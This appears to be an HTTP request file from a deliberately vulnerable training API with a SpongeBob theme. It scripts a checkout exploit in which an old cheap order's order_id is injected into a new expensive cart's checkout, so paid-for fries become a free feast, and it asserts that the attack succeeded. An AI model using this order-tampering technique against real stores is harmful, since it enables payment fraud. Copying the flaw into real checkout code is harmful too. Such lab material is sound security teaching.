# @import ../common/setup.http
@base = {{base_host}}/v103

### Step 1: Plankton buys a "Side of Fries" legitimately
# @name cheap_cart
POST {{base}}/cart
Authorization: {{sandy_auth}}

POST {{base}}/cart/{{cheap_cart.response.body.cart_id}}/items
Authorization: {{sandy_auth}}
Content-Type: application/json

{ "item_id": "2" }

# @name cheap_order
POST {{base}}/cart/{{cheap_cart.response.body.cart_id}}/checkout
Authorization: {{sandy_auth}}
Content-Type: application/x-www-form-urlencoded

tip=0&delivery_address=Chum Bucket

### Step 2: Plankton fills a NEW cart with the "Ultimate Krusty Krab"
# @name expensive_cart
POST {{base}}/cart
Authorization: {{sandy_auth}}

POST {{base}}/cart/{{expensive_cart.response.body.cart_id}}/items
Authorization: {{sandy_auth}}
Content-Type: application/json

{ "item_id": "5" }

### Exploit: Plankton performs a "Time Travel" attack
# He checks out the expensive cart, but injects the `order_id` of his previous cheap order.
# The system overwrites the old order with the new items, bypassing the payment logic for a new order.
# @name exploit
POST {{base}}/cart/{{expensive_cart.response.body.cart_id}}/checkout
Authorization: {{sandy_auth}}
Content-Type: application/json

{
  "tip": 0,
  "delivery_address": "Chum Bucket",
  "order_id": {{cheap_order.response.body.order_id}}
}

# Verification: The returned order has the OLD ID but the NEW expensive items.
?? status == 201
?? body.order_id == {{cheap_order.response.body.order_id}}
?? body.items[0].item_id == 5

### Impact: Plankton's balance barely moved
# He paid for fries (~$6) but got the feast ($50+).
GET {{base}}/account/info
Authorization: {{sandy_auth}}

?? status == 200
# We assert that the balance is higher than if he paid for the expensive meal.
# Initial (100) - Fries (6) = 94. Expensive would be < 50.
?? js parseFloat(response.body.balance) > 80.00
